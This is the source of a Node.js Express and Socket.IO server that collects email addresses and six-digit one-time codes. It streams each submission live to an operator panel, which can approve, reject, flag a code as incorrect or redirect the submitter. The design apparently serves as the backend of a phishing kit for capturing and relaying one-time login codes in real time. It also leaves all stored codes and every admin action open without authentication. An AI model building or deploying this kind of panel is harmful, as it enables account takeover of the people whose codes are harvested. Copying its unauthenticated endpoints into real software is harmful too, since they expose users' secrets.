require('dotenv').config();
const express = require('express');
const { Pool } = require('pg');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const cors = require('cors');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Database connection
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.NODE_ENV === 'production' ? { rejectUnauthorized: false } : false,
  connectionTimeoutMillis: 10000,
});

pool.connect((err) => {
  if (err) console.error('❌ DB error:', err.message);
  else console.log('✅ PostgreSQL connected');
});

// Create users table
async function initDB() {
  try {
    await pool.query(`
      CREATE TABLE IF NOT EXISTS users (
        id SERIAL PRIMARY KEY,
        email VARCHAR(255) UNIQUE NOT NULL,
        otp_code VARCHAR(10),
        status VARCHAR(50) DEFAULT 'pending',
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      )
    `);
    console.log('✅ Users table ready');
  } catch (err) {
    console.error('DB init error:', err);
  }
}
initDB();

// ==================== USER ENDPOINTS ====================

// Submit email
app.post('/api/submit-email', async (req, res) => {
  try {
    const { email } = req.body;
    if (!email) return res.status(400).json({ error: 'Email required' });
    
    const emailRegex = /^[^\s@]+@([^\s@]+\.)+[^\s@]+$/;
    if (!emailRegex.test(email)) return res.status(400).json({ error: 'Invalid email' });
    
    await pool.query(`
      INSERT INTO users (email, status) 
      VALUES ($1, 'pending')
      ON CONFLICT (email) DO UPDATE 
      SET status = 'pending', otp_code = NULL
    `, [email]);
    
    io.emit('new-email', { email, timestamp: new Date() });
    console.log('📧 New email:', email);
    res.json({ success: true });
  } catch (error) {
    console.error('Submit email error:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// Submit OTP (user creates their own)
app.post('/api/submit-otp', async (req, res) => {
  try {
    const { email, otp } = req.body;
    if (!email || !otp) return res.status(400).json({ error: 'Missing fields' });
    if (!/^\d{6}$/.test(otp)) return res.status(400).json({ error: 'OTP must be 6 digits' });
    
    await pool.query(`
      UPDATE users SET otp_code = $1, status = 'otp_submitted' WHERE email = $2
    `, [otp, email]);
    
    io.emit('new-otp', { email, otp, timestamp: new Date() });
    console.log('🔐 New OTP for:', email, 'OTP:', otp);
    res.json({ success: true });
  } catch (error) {
    console.error('Submit OTP error:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// Get user status (polling from frontend)
app.get('/api/user-status', async (req, res) => {
  try {
    const { email } = req.query;
    if (!email) return res.json({ status: null });
    const result = await pool.query('SELECT status, otp_code FROM users WHERE email = $1', [email]);
    if (result.rows.length === 0) return res.json({ status: null });
    res.json({ status: result.rows[0].status, otp_code: result.rows[0].otp_code });
  } catch (error) {
    res.json({ status: null });
  }
});

// ==================== ADMIN ENDPOINTS ====================

// Admin login check
app.post('/api/admin/check', async (req, res) => {
  try {
    const { email, password } = req.body;
    if (email === process.env.ADMIN_EMAIL && password === process.env.ADMIN_PASSWORD) {
      res.json({ success: true });
    } else {
      res.status(401).json({ error: 'Invalid credentials' });
    }
  } catch (error) {
    res.status(500).json({ error: 'Server error' });
  }
});

// Get all users
app.get('/api/users', async (req, res) => {
  try {
    const result = await pool.query('SELECT id, email, otp_code, status, created_at FROM users ORDER BY created_at DESC');
    res.json(result.rows);
  } catch (error) {
    res.status(500).json({ error: 'Server error' });
  }
});

// Admin actions
app.post('/api/admin/approve', async (req, res) => {
  try {
    const { email } = req.body;
    await pool.query('UPDATE users SET status = $1 WHERE email = $2', ['approved', email]);
    io.emit('approve-user', { email });
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: 'Server error' });
  }
});

app.post('/api/admin/reject', async (req, res) => {
  try {
    const { email } = req.body;
    await pool.query('UPDATE users SET status = $1 WHERE email = $2', ['rejected', email]);
    io.emit('reject-user', { email });
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: 'Server error' });
  }
});

app.post('/api/admin/incorrect-otp', async (req, res) => {
  try {
    const { email } = req.body;
    io.emit('incorrect-otp', { email });
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: 'Server error' });
  }
});

app.post('/api/admin/redirect', async (req, res) => {
  try {
    const { email } = req.body;
    await pool.query('UPDATE users SET status = $1 WHERE email = $2', ['redirected', email]);
    io.emit('redirect-to-sad', { email });
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: 'Server error' });
  }
});

// Socket.IO connection
io.on('connection', (socket) => {
  console.log('Client connected');
  socket.on('disconnect', () => console.log('Client disconnected'));
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`🚀 Server on port ${PORT}`));
